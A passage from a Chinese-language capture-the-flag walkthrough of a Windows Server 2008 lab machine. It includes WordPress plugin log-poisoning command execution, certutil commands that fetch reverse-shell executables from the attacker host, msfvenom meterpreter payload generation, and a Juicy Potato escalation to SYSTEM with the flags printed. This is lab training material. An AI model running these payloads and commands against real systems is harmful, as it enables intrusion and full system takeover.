192.168.56.1 - - [15/Aug/2024:21:00:56 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 968 "-" "curl/8.8.0"
192.168.56.1 - - [25/Nov/2024:22:26:47 -0800] "GET / HTTP/1.1" 302 - "-" "curl/8.10.1"
192.168.10.101 - - [04/Jun/2025:15:07:45 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log HTTP/1.1" 200 1288 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
192.168.10.101 - - [04/Jun/2025:15:08:02 -0700] "GET /wordpress/ HTTP/1.1" 200 22542 "-" "****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
"
fe80::5479:dd94:1d27:478c - - [04/Jun/2025:15:08:07 -0700] "POST /wordpress/wp-cron.php?doing_wp_cron=1749074886.8125000000000000000000 HTTP/1.1" 200 - "http://tripladvisor:8080/wordpress/wp-cron.php?doing_wp_cron=1749074886.8125000000000000000000" "WordPress/5.1.19; http://tripladvisor:8080/wordpress"
192.168.10.101 - - [04/Jun/2025:15:08:35 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=dir HTTP/1.1" 200 2754 "-" "curl/8.5.0"
{"success":true,"data":{"output":[]}} 
```

发现已经下载到了！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737266.png" alt="image-20250604144106404" style="zoom:50%;" />

然后激活一下：

```bash
http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=C:\Windows\Temp\revshell.exe
```

但是没成功弹出来，不使用pwncat换其他的试试。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737267.png" alt="image-20250604144537941" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737268.png" alt="image-20250604144710481" style="zoom:50%;" />

成功弹出来了！

## 提权

### 信息搜集

首先在桌面找到了一个flag。。

```bash
c:\Users\websvc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users\websvc\Desktop

08/15/2024  09:02 PM    <DIR>          .
08/15/2024  09:02 PM    <DIR>          ..
06/30/2024  10:10 AM                33 user.txt
               1 File(s)             33 bytes
               2 Dir(s)  23,848,247,296 bytes free

c:\Users\websvc\Desktop>type user.txt
type user.txt
4159a2b3a38697518722695cbb09ee46
```

然后搜集一下其他信息：

```bash
c:\Users\websvc\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID                                           
=================== ==============================================
tripladvisor\websvc S-1-5-21-2621822639-2474692399-1676906194-1003


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\Users\websvc\Desktop>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : TriplAdvisor
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter
   Physical Address. . . . . . . . . : 08-00-27-D3-33-DD
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : fd00:4c10:d50a:f900::1002(Preferred) 
   Lease Obtained. . . . . . . . . . : Wednesday, June 04, 2025 3:07:19 PM
   Lease Expires . . . . . . . . . . : Thursday, June 05, 2025 3:07:19 PM
   IPv6 Address. . . . . . . . . . . : fd00:4c10:d50a:f900:5479:dd94:1d27:478c(Deprecated) 
   Link-local IPv6 Address . . . . . : fe80::5479:dd94:1d27:478c%3(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.10.103(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Wednesday, June 04, 2025 3:06:56 PM
   Lease Expires . . . . . . . . . . : Wednesday, June 04, 2025 5:06:56 PM
   Default Gateway . . . . . . . . . : fe80::4e10:d5ff:fe0a:f900%3
                                       192.168.10.1
   DHCP Server . . . . . . . . . . . : 192.168.10.1
   DHCPv6 IAID . . . . . . . . . . . : 50855975
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-F5-24-BC-08-00-27-B4-04-E4
   DNS Servers . . . . . . . . . . . : fd00:4c10:d50a:f900:4e10:d5ff:fe0a:f900
                                       192.168.1.1
                                       192.168.10.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
   
c:\Users\websvc\Desktop>systeminfo
systeminfo

Host Name:                 TRIPLADVISOR
OS Name:                   Microsoft Windows Server 2008 R2 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00486-109-0000007-84212
Original Install Date:     6/7/2024, 1:24:47 PM
System Boot Time:          6/4/2025, 3:06:38 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2578 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              fr;French (France)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,353 MB
Available Physical Memory: 3,482 MB
Virtual Memory: Max Size:  8,703 MB
Virtual Memory: Available: 7,796 MB
Virtual Memory: In Use:    907 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.10.1
                                 IP address(es)
                                 [01]: 192.168.10.103
                                 [02]: fe80::5479:dd94:1d27:478c
                                 [03]: fd00:4c10:d50a:f900:5479:dd94:1d27:478c
                                 [04]: fd00:4c10:d50a:f900::1002
```

不行了，windows不太会，看的一头雾水，上msf看看相关信息：

```bash
┌──(kali💀kali)-[~]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.10.101 
LHOST => 192.168.10.101
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.10.101:1234 
[*] Command shell session 1 opened (192.168.10.101:1234 -> 192.168.10.103:49181) at 2025-06-04 03:11:07 -0400


Shell Banner:
Microsoft Windows [Version 6.1.7600]
-----
          

C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes>
```

使用相关的检查脚本，ctrl+Z，选择 y，则将当前shell放到后台。

```bash
c:\Windows\Temp>^Z
Background session 1? [y/N]  y
msf6 exploit(multi/handler) > search local_exploit_suggest

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7600] -----  192.168.10.101:1234 -> 192.168.10.103:49181 (192.168.10.103)

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.10.103 - Collecting local exploits for x64/windows...
[*] 192.168.10.103 - 196 exploit checks are being tried...
[*] Running check method for exploit 1 / 1
[*] 192.168.10.103 - Valid modules for session 1:
============================

 #  Name                                            Potentially Vulnerable?  Check Result
 -  ----                                            -----------------------  ------------
 1  exploit/windows/local/win_error_cve_2023_36874  No                       The target is not exploitable.

[*] Post module execution completed
```

没发现啥漏洞。。。。自此就陷入长时间的僵持状态了，然后看师傅们的wp，是因为这个shell功能太低，需要切换至meterpreter进行搜集。。。。

好，重来。。。。

```bash
# kali1
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.101 LPORT=1234 -f exe -o pentest.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: pentest.exe

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ updog -p 8888
[+] Serving /home/kali/temp/TriplAdvisor...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://10.0.2.4:8888
Press CTRL+C to quit
192.168.10.103 - - [04/Jun/2025 03:52:21] "GET /pentest.exe HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 03:52:21] "GET /pentest.exe HTTP/1.1" 200 -
```

```bash
# kali2
┌──(kali💀kali)-[~]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > set LHOST 192.168.10.101
LHOST => 192.168.10.101
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.10.101:1234 
[*] Sending stage (201798 bytes) to 192.168.10.103
[*] Meterpreter session 1 opened (192.168.10.101:1234 -> 192.168.10.103:49185) at 2025-06-04 03:52:57 -0400

meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  3
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:d3:33:dd
MTU          : 1500
IPv4 Address : 192.168.10.103
IPv4 Netmask : 255.255.255.0
IPv6 Address : fd00:4c10:d50a:f900::1002
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : fd00:4c10:d50a:f900:5479:dd94:1d27:478c
IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : fe80::5479:dd94:1d27:478c
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > getuid
Server username: TRIPLADVISOR\websvc
meterpreter > sysinfo
Computer        : TRIPLADVISOR
OS              : Windows Server 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > sessions -l
Usage: sessions [options] or sessions [id]

Interact with a different session ID.

OPTIONS:

    -h, --help           Show this message
    -i, --interact <id>  Interact with a provided session ID

meterpreter > shell
Process 2348 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes>^Z
Background channel 1? [y/N]  y

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                         Connection
  --  ----  ----                     -----------                         ----------
  1         meterpreter x64/windows  TRIPLADVISOR\websvc @ TRIPLADVISOR  192.168.10.101:1234 -> 192.168.10.103:49185 (192.168.10.103)

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.10.103 - Collecting local exploits for x64/windows...
[*] 192.168.10.103 - 196 exploit checks are being tried...
[+] 192.168.10.103 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.10.103 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 192.168.10.103 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.10.103 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
[+] 192.168.10.103 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.10.103 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.10.103 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 192.168.10.103 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 192.168.10.103 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 192.168.10.103 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[*] Running check method for exploit 45 / 45
[*] 192.168.10.103 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 12  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 13  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 14  exploit/windows/local/bypassuac_dotnet_profiler                No                       The target is not exploitable.
 15  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 16  exploit/windows/local/bypassuac_sdclt                          No                       The target is not exploitable.
 17  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 18  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 19  exploit/windows/local/capcom_sys_exec                          No                       Cannot reliably check exploitability.
 20  exploit/windows/local/cve_2020_0796_smbghost                   No                       The target is not exploitable.
 21  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 22  exploit/windows/local/cve_2020_1313_system_orchestrator        No                       The target is not exploitable.
 23  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 24  exploit/windows/local/cve_2020_17136                           No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
 25  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.
 26  exploit/windows/local/cve_2022_21882_win32k                    No                       The target is not exploitable.
 27  exploit/windows/local/cve_2022_21999_spoolfool_privesc         No                       The target is not exploitable. Windows 7 is technically vulnerable, though it requires a reboot. 28  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
 29  exploit/windows/local/cve_2023_21768_afd_lpe                   No                       The target is not exploitable. The exploit only supports Windows 11 22H2
 30  exploit/windows/local/cve_2023_28252_clfs_driver               No                       The target is not exploitable. The target system does not have clfs.sys in system32\drivers\
 31  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 32  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 33  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 34  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2008 R2 (6.1 Build 7600). is not vulnerable
 35  exploit/windows/local/ms15_078_atmfd_bof                       No                       Cannot reliably check exploitability.
 36  exploit/windows/local/ms16_014_wmi_recv_notif                  No                       The target is not exploitable.
 37  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 38  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
 39  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 41  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.
 42  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 43  exploit/windows/local/virtual_box_opengl_escape                No                       The target is not exploitable.
 44  exploit/windows/local/webexec                                  No                       The check raised an exception.
 45  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.

[*] Post module execution completed
```

```bash
# kali3
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=certutil+-urlcache+-split+-f+http://192.168.10.101:8888/pentest.exe+C:\Windows\Temp\pentest.exe"
192.168.56.1 - - [14/Aug/2024:10:42:52 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/error.log HTTP/1.1" 200 5728866 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:43:07 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 272 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:44:38 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 504 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:52:26 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 736 "-" "curl/8.8.0"
192.168.56.1 - - [15/Aug/2024:21:00:56 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 968 "-" "curl/8.8.0"
192.168.56.1 - - [25/Nov/2024:22:26:47 -0800] "GET / HTTP/1.1" 302 - "-" "curl/8.10.1"
192.168.10.101 - - [04/Jun/2025:15:07:45 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log HTTP/1.1" 200 1288 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
192.168.10.101 - - [04/Jun/2025:15:08:02 -0700] "GET /wordpress/ HTTP/1.1" 200 22542 "-" "****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
"
fe80::5479:dd94:1d27:478c - - [04/Jun/2025:15:08:07 -0700] "POST /wordpress/wp-cron.php?doing_wp_cron=1749074886.8125000000000000000000 HTTP/1.1" 200 - "http://tripladvisor:8080/wordpress/wp-cron.php?doing_wp_cron=1749074886.8125000000000000000000" "WordPress/5.1.19; http://tripladvisor:8080/wordpress"
192.168.10.101 - - [04/Jun/2025:15:08:35 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=dir HTTP/1.1" 200 2754 "-" "curl/8.5.0"
192.168.10.101 - - [04/Jun/2025:15:40:23 -0700] "GET /wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=certutil+-urlcache+-split+-f+http://192.168.10.101:8888/revshell.exe+C:\\Windows\\Temp\\revshell.exe HTTP/1.1" 200 2326 "-" "curl/8.5.0"
192.168.10.101 - - [04/Jun/2025:15:43:49 -0700] "GET /wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=C:\\Windows\\Temp\\revshell.exe HTTP/1.1" 500 1640 "-" "curl/8.5.0"
192.168.10.101 - - [04/Jun/2025:15:45:59 -0700] "GET /wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=C:\\Windows\\Temp\\revshell.exe HTTP/1.1" 500 1640 "-" "curl/8.5.0"
192.168.10.101 - - [04/Jun/2025:16:04:32 -0700] "GET /wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=C:\\Windows\\Temp\\revshell.exe HTTP/1.1" 200 3129 "-" "curl/8.5.0"
192.168.10.101 - - [04/Jun/2025:16:08:24 -0700] "GET /wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=C:\\Windows\\Temp\\revshell.exe HTTP/1.1" 200 3405 "-" "curl/8.5.0"
192.168.10.101 - - [04/Jun/2025:16:11:23 -0700] "GET /wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=C:\\Windows\\Temp\\revshell.exe HTTP/1.1" 500 1640 "-" "curl/8.5.0"
192.168.10.101 - - [04/Jun/2025:16:36:03 -0700] "GET /wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=C:\\Windows\\Temp\\revshell.exe HTTP/1.1" 500 1640 "-" "curl/8.5.0"
{"success":true,"data":{"output":[]}}                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=C:\Windows\Temp\pentest.exe" 


```

### msf提权

发现服务器的型号和里面对应上了`Windows Server 2008 R2 (6.1 Build 7600).`，看师傅们的博客似乎说`SeImpersonatePrivilege`权限可以使用`JuicyPotato`进行提权，试一下msf：

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_075_reflection_juicy
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) > options

Module options (exploit/windows/local/ms16_075_reflection_juicy):

   Name     Current Setting                         Required  Description
   ----     ---------------                         --------  -----------
   CLSID    {4991d34b-80a1-4291-83b6-3328366b9097}  yes       Set CLSID value of the DCOM to trigger
   SESSION                                          yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.4         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms16_075_reflection_juicy) > set session 1
session => 1
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lhost 192.168.10.101
lhost => 192.168.10.101
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lport 2345
lport => 2345
msf6 exploit(windows/local/ms16_075_reflection_juicy) > run

[*] Started reverse TCP handler on 192.168.10.101:2345 
[+] Target appears to be vulnerable (Windows 2008 R2)
[*] Launching notepad to host the exploit...
[+] Process 3052 launched.
[*] Reflectively injecting the exploit DLL into 3052...
[*] Injecting exploit into 3052...
[*] Exploit injected. Injecting exploit configuration into 3052...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 192.168.10.103
[*] Meterpreter session 2 opened (192.168.10.101:2345 -> 192.168.10.103:49190) at 2025-06-04 04:08:37 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2580 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd c:/users/administrator/desktop
cd c:/users/administrator/desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users\Administrator\Desktop

08/15/2024  09:02 PM    <DIR>          .
08/15/2024  09:02 PM    <DIR>          ..
06/30/2024  10:10 AM                33 root.txt
               1 File(s)             33 bytes
               2 Dir(s)  23,797,780,480 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
5b38df6802c305e752c8f02358721acc
```

提权成功。

### JuicyPotato提权

如果不使用msf的话，需要使用一些相关工具进行提权：

> - https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

工具的使用具体参考：https://ohpe.it/juicy-potato/

跟着[ta0神](https://ta0.fun/posts/637ff6f0/)做就完了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737269.png" alt="image-20250604162241702" style="zoom:50%;" />

![image-20250604162406765](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737270.png)

![image-20250604162432905](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737271.png)

找到我们想要的，然后下到靶机上：

> - https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/CLSID.list
> - https://ohpe.it/juicy-potato/Test/test_clsid.bat

这里不行就重启了一下靶机。。这里注意不要下载到temp目录，好像执行不了。。

#### 首先下载相关的测试脚本

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.10.101] from (UNKNOWN) [192.168.10.103] 49190
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes>cd c:/users
cd c:/users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users

06/29/2024  01:26 PM    <DIR>          .
06/29/2024  01:26 PM    <DIR>          ..
